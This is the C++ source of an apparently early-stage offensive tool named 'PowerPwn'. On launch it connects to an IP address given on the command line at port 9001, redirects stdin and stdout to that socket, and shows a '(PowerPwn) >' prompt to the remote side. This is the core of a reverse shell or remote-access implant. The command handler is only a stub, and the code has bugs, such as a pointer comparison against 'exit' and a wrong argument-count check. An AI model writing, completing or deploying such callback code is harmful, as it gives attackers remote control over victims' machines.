#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <cstdint>
#include <string>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>

#include <string>

#include "includes/PowerPwn.h"

uint8_t sd(void) {
    return 0;
}

void get_input(char input[BUFFER]) {
    fgets(input, BUFFER, stdin);
    input[strcspn(input, "\n")] = 0;
}

void green(void) {
    std::string green = "\x1b[32m";
    write(sd(), green.data(), green.length());
}

void red(void) {
    std::string red = "\x1b[31m";
    write(sd(), red.data(), red.length());
}


int options(void) {
    struct commands *cmd = NULL;
    char *option = new char[BUFFER];

    cmd = (commands*)malloc(sizeof(struct commands));
    get_input(option);

    cmd->exit = "exit";

    if (option == cmd->exit) {
        return 1;
    }

    return 0;
}

void main_loop(void) {
    std::string powerpwn = "(PowerPwn) > ";

    do {
        red();
        write(sd(), powerpwn.data(), powerpwn.length());
        green();
    } while (options() != 1);
}

void create_connection(char ip[CMDLINE_BUFFER]) {
    uint16_t port = 9001;
    const int sock = socket(AF_INET, SOCK_STREAM, 0);;
    struct sockaddr_in address;

    address.sin_family = AF_INET;
    address.sin_addr.s_addr = inet_addr(ip);
    address.sin_port = htons(port);
    connect(sock, (struct sockaddr *)&address, sizeof(address));
    dup2(sock, sd());
    dup2(sock, 1);
}

int main(int argc, char **argv) {
    if (argc < 1)
        return 1;

    create_connection(argv[1]);
    main_loop();
    return 0;
}